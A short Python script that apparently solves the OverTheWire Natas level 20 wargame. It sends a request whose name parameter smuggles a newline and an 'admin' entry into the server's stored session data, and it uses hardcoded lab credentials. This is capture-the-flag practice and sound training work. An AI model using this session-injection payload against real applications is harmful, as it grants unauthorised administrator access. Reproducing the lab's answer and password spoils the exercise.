#! env python3.9

import requests

site = "http://natas20.natas.labs.overthewire.org/index.php?debug&name=admin\";\nadmin|s:1:\"1"
user = "natas20"
pswd = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"

r = requests.get(site, auth=(user, pswd))
print(r.text)



